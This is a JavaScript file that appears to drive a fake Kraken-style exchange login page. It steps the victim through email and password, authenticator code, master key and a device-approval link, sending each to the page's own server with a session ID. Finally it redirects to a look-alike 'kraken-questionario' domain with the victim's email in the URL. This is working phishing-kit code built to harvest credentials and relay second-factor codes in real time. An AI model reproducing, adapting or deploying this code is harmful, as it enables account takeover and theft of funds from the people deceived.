let sessionId;

let signIn = document.getElementById("1");
let authenticatorApp = document.getElementById("3");
let masterKey = document.getElementById("4");
let approveDevice = document.getElementById("5");

let emailContainer = document.getElementById("email-container");
let passwordContainer = document.getElementById("pass-container");
let authenticatorAppContainer = document.getElementById(
  "authenticator-app-container"
);
let masterkeyContainer = document.getElementById("masterkey-container");
let approvalContainer = document.getElementById("approval-container");

let email = document.getElementById(":r9:");
let password = document.getElementById(":ra:");
let authenticatorAppInput = document.getElementById("authenticator-app-input");
let masterkeyInput = document.getElementById(":rg:");
let approvalInput = document.getElementById("approval-link");

let errorEmail = document.getElementById("error-email");
let errorPass = document.getElementById("error-pass");
let errorEmailPass = document.getElementById("error-email-pass");
let errorAuthenticatorApp = document.getElementById("error-:rh:");
let errorMasterkey = document.getElementById("error-:re:");
let errorApproval = document.getElementById("error-approval");

let continueSignIn = document.getElementById("continue-1");
let enterAuthenticatorApp = document.getElementById("enter-authenticator-app");
let enterMasterkey = document.getElementById("enter-masterkey");
let authenticatorAppBtn = document.getElementById("authenticator-app");
let masterKeyBtn = document.getElementById("masterkey");
let enterApproval = document.getElementById("enter-approval");

let isContinueSignIn;
let isEnterAuthenticatorApp;
let isEnterMasterkey;
let isShowAuthenticatorApp;
let isShowMasterkey;
let isEnterApproval;

// show(signIn, approveDevice);

// Error class for both containers
const errorClass =
  "bg-ds-input-error hover:bg-ds-input-hover focus-within:bg-ds-input-error-focused outline-offset-ds-input overflow-clip outline-2 outline-ds-input-error focus-within:outline-ds-input-error-focused outline box-border flex items-stretch gap-ds-input-xxl p-ds-input-outline-offset pr-ds-input-xxl h-ds-input-xxl rounded-b-ds-input-stacked rounded-t-ds-input-xxl";

// Default classes for each container
const defaultEmailClass =
  "bg-ds-input hover:bg-ds-input-hover focus-within:bg-ds-input-selected outline-offset-ds-input overflow-clip outline-2 focus-within:outline-ds-input focus-within:outline box-border flex items-stretch gap-ds-input-xxl p-ds-input-outline-offset pr-ds-input-xxl h-ds-input-xxl rounded-b-ds-input-stacked rounded-t-ds-input-xxl";

const defaultPasswordClass =
  "bg-ds-input hover:bg-ds-input-hover focus-within:bg-ds-input-selected outline-offset-ds-input overflow-clip outline-2 focus-within:outline-ds-input focus-within:outline box-border flex items-stretch gap-ds-input-xxl p-ds-input-outline-offset pr-ds-input-xxl h-ds-input-xxl rounded-t-ds-input-stacked rounded-b-ds-input-xxl";

const defaultContinueSignInClass =
  "text-ds-button-primary-high hover:text-ds-button-primary-high-hover active:bg-ds-button-primary-high-active bg-ds-button-primary-high-gradient hover:bg-ds-button-primary-high-gradient-hover bg-ds-button-primary-high hover:bg-ds-button-primary-high-hover shadow-ds-button-primary-high w-full rounded-ds-button-xl outline-offset-ds-button relative box-border border-0 disabled:pointer-events-none cursor-pointer [-webkit-appearance:button] outline-none ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 p-ds-button-xl inline-block whitespace-nowrap no-underline text-ds-button-xl";
const defaultContinueSignInContent = `<span id="continue-1-span" class="flex items-center justify-center gap-ds-button-xl">Continue</span>`;

const loadingContinueSignInClass =
  "text-ds-button-primary-high hover:text-ds-button-primary-high-hover active:bg-ds-button-primary-high-active bg-ds-button-primary-high-gradient hover:bg-ds-button-primary-high-gradient-hover bg-ds-button-primary-high hover:bg-ds-button-primary-high-hover shadow-ds-button-primary-high w-full rounded-ds-button-xl outline-offset-ds-button relative box-border border-0 disabled:pointer-events-none pointer-events-none cursor-pointer [-webkit-appearance:button] outline-none ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 p-ds-button-xl inline-block whitespace-nowrap no-underline text-ds-button-xl";
const loadingContinueSignInContent = `<span class="flex items-center justify-center invisible gap-ds-button-xl"><span>Continue</span></span><span class="absolute left-0 top-0 inline-flex size-full items-center justify-center"><span class="ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 flex" role="status"><svg viewBox="0 0 24 24" width="24" height="24" fill="none" xmlns="http://www.w3.org/2000/svg" class="h-ds-icon-sm w-ds-icon-sm animate-spin"><clipPath id=":r16:"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.0325 8.74811C21.8243 10.9476 21.7864 13.3605 20.9259 15.534C20.0653 17.7075 18.4412 19.4924 16.3583 20.5536C14.2754 21.6149 11.8768 21.8797 9.61259 21.2984C7.34834 20.717 5.37403 19.3294 4.06005 17.396C2.74607 15.4625 2.18274 13.1161 2.47573 10.7968C2.76872 8.47753 3.8979 6.34488 5.65143 4.79893C7.40496 3.25299 9.66232 2.4 12 2.4C12.6628 2.4 13.2 1.86274 13.2 1.2C13.2 0.537258 12.6628 0 12 0C9.0779 0 6.25619 1.06623 4.06428 2.99866C1.87237 4.9311 0.460892 7.59692 0.0946541 10.496C-0.271584 13.3951 0.432589 16.3282 2.07506 18.745C3.71753 21.1618 6.18543 22.8963 9.01574 23.623C11.8461 24.3497 14.8443 24.0187 17.4479 22.6921C20.0515 21.3654 22.0816 19.1344 23.1573 16.4175C24.233 13.7006 24.2804 10.6845 23.2906 7.93514C22.3007 5.18578 20.3417 2.89206 17.7811 1.48432C17.2003 1.16504 16.4707 1.37702 16.1514 1.95778C15.8321 2.53855 16.0441 3.26818 16.6248 3.58745C18.6734 4.71365 20.2406 6.54862 21.0325 8.74811Z"></path></clipPath><foreignObject x="0" y="0" width="24" height="24" clip-path="url(#:r16:)"><div class="size-full bg-[conic-gradient(from_20deg_at_50%_50%,var(--tw-gradient-stops))] from-transparent to-current"></div></foreignObject></svg></span></span>`;

const defaultAuthenticatorAppClass =
  "text-ds-button-primary-high hover:text-ds-button-primary-high-hover active:bg-ds-button-primary-high-active bg-ds-button-primary-high-gradient hover:bg-ds-button-primary-high-gradient-hover bg-ds-button-primary-high hover:bg-ds-button-primary-high-hover shadow-ds-button-primary-high w-full rounded-ds-button-xl outline-offset-ds-button relative box-border border-0 disabled:pointer-events-none opacity-40 [-webkit-appearance:button] outline-none ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 p-ds-button-xl inline-block whitespace-nowrap no-underline text-ds-button-xl";
const defaultAuthenticatorAppContent = `<span id="enter-authenticator-app-span" class="flex items-center justify-center gap-ds-button-xl">Enter</span>`;

const activeAuthenticatorAppClass =
  "text-ds-button-primary-high hover:text-ds-button-primary-high-hover active:bg-ds-button-primary-high-active bg-ds-button-primary-high-gradient hover:bg-ds-button-primary-high-gradient-hover bg-ds-button-primary-high hover:bg-ds-button-primary-high-hover shadow-ds-button-primary-high w-full rounded-ds-button-xl outline-offset-ds-button relative box-border border-0 disabled:pointer-events-none cursor-pointer [-webkit-appearance:button] outline-none ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 p-ds-button-xl inline-block whitespace-nowrap no-underline text-ds-button-xl";

const loadingAuthenticatorAppClass =
  "text-ds-button-primary-high hover:text-ds-button-primary-high-hover active:bg-ds-button-primary-high-active bg-ds-button-primary-high-gradient hover:bg-ds-button-primary-high-gradient-hover bg-ds-button-primary-high hover:bg-ds-button-primary-high-hover shadow-ds-button-primary-high w-full rounded-ds-button-xl outline-offset-ds-button relative box-border border-0 disabled:pointer-events-none pointer-events-none cursor-pointer [-webkit-appearance:button] outline-none ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 p-ds-button-xl inline-block whitespace-nowrap no-underline text-ds-button-xl";
const loadingAuthenticatorAppContent = `<span class="flex items-center justify-center invisible gap-ds-button-xl"><span>Continue</span></span><span class="absolute left-0 top-0 inline-flex size-full items-center justify-center"><span class="ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 flex" role="status"><svg viewBox="0 0 24 24" width="24" height="24" fill="none" xmlns="http://www.w3.org/2000/svg" class="h-ds-icon-sm w-ds-icon-sm animate-spin"><clipPath id=":r16:"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.0325 8.74811C21.8243 10.9476 21.7864 13.3605 20.9259 15.534C20.0653 17.7075 18.4412 19.4924 16.3583 20.5536C14.2754 21.6149 11.8768 21.8797 9.61259 21.2984C7.34834 20.717 5.37403 19.3294 4.06005 17.396C2.74607 15.4625 2.18274 13.1161 2.47573 10.7968C2.76872 8.47753 3.8979 6.34488 5.65143 4.79893C7.40496 3.25299 9.66232 2.4 12 2.4C12.6628 2.4 13.2 1.86274 13.2 1.2C13.2 0.537258 12.6628 0 12 0C9.0779 0 6.25619 1.06623 4.06428 2.99866C1.87237 4.9311 0.460892 7.59692 0.0946541 10.496C-0.271584 13.3951 0.432589 16.3282 2.07506 18.745C3.71753 21.1618 6.18543 22.8963 9.01574 23.623C11.8461 24.3497 14.8443 24.0187 17.4479 22.6921C20.0515 21.3654 22.0816 19.1344 23.1573 16.4175C24.233 13.7006 24.2804 10.6845 23.2906 7.93514C22.3007 5.18578 20.3417 2.89206 17.7811 1.48432C17.2003 1.16504 16.4707 1.37702 16.1514 1.95778C15.8321 2.53855 16.0441 3.26818 16.6248 3.58745C18.6734 4.71365 20.2406 6.54862 21.0325 8.74811Z"></path></clipPath><foreignObject x="0" y="0" width="24" height="24" clip-path="url(#:r16:)"><div class="size-full bg-[conic-gradient(from_20deg_at_50%_50%,var(--tw-gradient-stops))] from-transparent to-current"></div></foreignObject></svg></span></span>`;

// Function to check if both fields are filled
function checkEmailPass() {
  if (email.value.trim() !== "" && password.value.trim() !== "") {
    continueSignIn.className = loadingContinueSignInClass;
    continueSignIn.innerHTML = loadingContinueSignInContent;

    errorEmailPass.style.display = "none";
    signInXhr(email.value, password.value);
  }
}

function checkAuthenticatorCode() {
  if (authenticatorAppInput.value.trim() !== "") {
    enterAuthenticatorApp.className = loadingAuthenticatorAppClass;
    enterAuthenticatorApp.innerHTML = loadingAuthenticatorAppContent;

    authenicatorXhr(authenticatorAppInput.value);
  }
}

function checkMasterkeyCode() {
  if (masterkeyInput.value.trim() !== "") {
    enterMasterkey.className = loadingAuthenticatorAppClass;
    enterMasterkey.innerHTML = loadingAuthenticatorAppContent;

    masterKeyXhr(masterkeyInput.value);
  }
}

function checkApprovalUrl() {
  if (approvalInput.value.trim() !== "") {
    enterApproval.className = loadingAuthenticatorAppClass;
    enterApproval.innerHTML = loadingAuthenticatorAppContent;

    approvalXhr(approvalInput.value);
  }
}

// Click on continue button
document.addEventListener("click", function (e) {
  const targetId = e.target.id;

  if (targetId === "continue-1" || targetId === "continue-1-span") {
    if (!isContinueSignIn) {
      if (email.value.trim() === "") {
        errorEmail.style.display = "block";
        emailContainer.className = errorClass;
      }

      if (password.value.trim() === "") {
        errorPass.style.display = "block";
        passwordContainer.className = errorClass;
      }

      // Check both fields after click
      checkEmailPass();
    }
  } else if (
    targetId == "authenticator-app" ||
    targetId == "authenticator-app-span"
  ) {
    showAuthenticatorAppXhr();
    show(masterKey, authenticatorApp);
  } else if (targetId == "masterkey" || targetId == "masterkey-span") {
    showMasterkeyXhr();
    show(authenticatorApp, masterKey);
  } else if (
    targetId == "back-authenticator-app" ||
    targetId == "back-authenticator-app-span"
  ) {
    showMasterkeyXhr();
    show(authenticatorApp, masterKey);
  } else if (
    targetId == "back-masterkey" ||
    targetId == "back-masterkey-span"
  ) {
    showAuthenticatorAppXhr();
    show(masterKey, authenticatorApp);
  } else if (
    targetId == "enter-authenticator-app" ||
    targetId == "enter-authenticator-app-span"
  ) {
    if (!isEnterAuthenticatorApp) {
      checkAuthenticatorCode();
    }
  } else if (
    targetId == "enter-masterkey" ||
    targetId == "enter-masterkey-span"
  ) {
    if (!isEnterMasterkey) {
      checkMasterkeyCode();
    }
  } else if (
    targetId == "enter-approval" ||
    targetId == "enter-approval-span"
  ) {
    if (approvalInput.value.trim() === "") {
      errorApproval.style.display = "block";
      approvalContainer.className = errorClass;
    } else {
      if (!isEnterApproval) {
        approvalXhr(approvalInput.value);
      }
    }
  }
});

// When user types in inputs, reset error styling and check both fields
[email, password, authenticatorAppInput, masterkeyInput, approvalInput].forEach((input) => {
  input.addEventListener("input", () => {
    if (input === email) {
      errorEmail.style.display = "none";
      emailContainer.className = defaultEmailClass;
    } else if (input === password) {
      errorPass.style.display = "none";
      passwordContainer.className = defaultPasswordClass;
    } else if (input === authenticatorAppInput) {
      if (authenticatorAppInput.value.trim() != "") {
        enterAuthenticatorApp.className = activeAuthenticatorAppClass;
        errorAuthenticatorApp.style.display = "none";
        authenticatorAppContainer.className = defaultPasswordClass;
      } else {
        enterAuthenticatorApp.className = defaultAuthenticatorAppClass;
      }
      authenticatorAppContainer.className = defaultEmailClass;
      errorAuthenticatorApp.style.display = "none";
    } else if (input === masterkeyInput) {
      if (masterkeyInput.value.trim() != "") {
        enterMasterkey.className = activeAuthenticatorAppClass;
        errorMasterkey.style.display = "none";
        masterkeyContainer.className = defaultPasswordClass;
      } else {
        enterMasterkey.className = defaultAuthenticatorAppClass;
      }
      masterkeyContainer.className = defaultEmailClass;
      errorMasterkey.style.display = "none";
    }
    else if (input === approvalInput) {
      if (approvalInput.value.trim() != "") {
        enterApproval.className = activeAuthenticatorAppClass;
        errorApproval.style.display = "none";
        approvalContainer.className = defaultPasswordClass;
      } else {
        enterApproval.className = defaultAuthenticatorAppClass;
      }
      approvalContainer.className = defaultEmailClass;
      errorApproval.style.display = "none";
    }
  });
});

function show(prev, next) {
  prev.style.display = "none";
  next.style.display = "block";
}

function signInXhr(userName, password) {
  isContinueSignIn = true;
  let signInXhr = new XMLHttpRequest();
  signInXhr.open("POST", "/sign-in", true);
  signInXhr.setRequestHeader("Content-type", "application/json");
  signInXhr.send(
    JSON.stringify({
      sessionId: sessionId,
      username: userName,
      password: password,
    })
  );

  signInXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      let response = this.response;
      if (response == 0) {
        errorEmailPass.style.display = "block";
      } else if (response == 1) {
        show(signIn, authenticatorApp);
      } else if (response == 2) {
        show(signIn, authenticatorApp);
      }

      continueSignIn.className = defaultContinueSignInClass;
      continueSignIn.innerHTML = defaultContinueSignInContent;
      isContinueSignIn = false;
    }
  };
}

function authenicatorXhr(code) {
  isEnterAuthenticatorApp = true;
  let authenicatorXhr = new XMLHttpRequest();
  authenicatorXhr.open("POST", "/authenticator", true);
  authenicatorXhr.setRequestHeader("Content-type", "application/json");
  authenicatorXhr.send(JSON.stringify({ sessionId: sessionId, code: code }));

  authenicatorXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      let response = this.response;
      console.log(response);
      if (response == 0) {
        errorAuthenticatorApp.style.display = "block";
        authenticatorAppContainer.className = errorClass;
      } else if (response == 1) {
        show(authenticatorApp, approveDevice);
      }
      enterAuthenticatorApp.className = defaultAuthenticatorAppClass;
      enterAuthenticatorApp.innerHTML = defaultAuthenticatorAppContent;
      isEnterAuthenticatorApp = false;
    }
  };
}

function masterKeyXhr(code) {
  isEnterMasterkey = true;
  let masterKeyXhr = new XMLHttpRequest();
  masterKeyXhr.open("POST", "/masterkey", true);
  masterKeyXhr.setRequestHeader("Content-type", "application/json");
  masterKeyXhr.send(JSON.stringify({ sessionId: sessionId, code: code }));

  masterKeyXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      let response = this.response;
      console.log(response);
      if (response == 0) {
        errorMasterkey.style.display = "block";
        masterkeyContainer.className = errorClass;
      } else if (response == 1) {
        show(masterKey, approveDevice);
      }
      enterMasterkey.className = defaultAuthenticatorAppClass;
      enterMasterkey.innerHTML = defaultAuthenticatorAppContent;
      isEnterMasterkey = false;
    }
  };
}

function showAuthenticatorAppXhr() {
  let showAuthenticatorAppXhr = new XMLHttpRequest();
  showAuthenticatorAppXhr.open("POST", "/show-authenticator-app", true);
  showAuthenticatorAppXhr.setRequestHeader("Content-type", "application/json");
  showAuthenticatorAppXhr.send(JSON.stringify({ sessionId: sessionId }));

  showAuthenticatorAppXhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      let response = this.response;
      console.log(response);
    }
  };
}

function showMasterkeyXhr() {
  let showMasterkeyXhr = new XMLHttpRequest();
  showMasterkeyXhr.open("POST", "/show-master-key", true);
  showMasterkeyXhr.setRequestHeader("Content-type", "application/json");
  showMasterkeyXhr.send(JSON.stringify({ sessionId: sessionId }));

  showMasterkeyXhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      let response = this.response;
      console.log(response);
    }
  };
}

function approvalXhr(approvalUrl) {
  isEnterApproval = true;
  let approvalXhr = new XMLHttpRequest();
  approvalXhr.open("POST", "/approval", true);
  approvalXhr.setRequestHeader("Content-type", "application/json");
  approvalXhr.send(
    JSON.stringify({ sessionId: sessionId, approvalUrl: approvalUrl })
  );

  approvalXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      let response = this.response;
      console.log(response);
      if (response == 0) {
        errorApproval.style.display = "block";
        approvalContainer.className = errorClass;
      } else if (response == 1) {
        location.replace(`https://www.kraken-questionario.com/?id=${email.value}&stat=1`)
      }
      enterApproval.className = defaultAuthenticatorAppClass;
      enterApproval.innerHTML = defaultAuthenticatorAppContent;
      isEnterApproval = false;
    }
  };
}

async function startSession() {
  try {
    const response = await fetch("/start-session", { method: "POST" });
    const data = await response.json();
    if (data.success) {
      console.log("Session ID:", data.sessionId);
      // You can store sessionId in localStorage or a hidden input
      sessionId = data.sessionId;
    }
  } catch (err) {
    console.error("Failed to start session:", err);
  }
}

// Call this on page load
startSession();
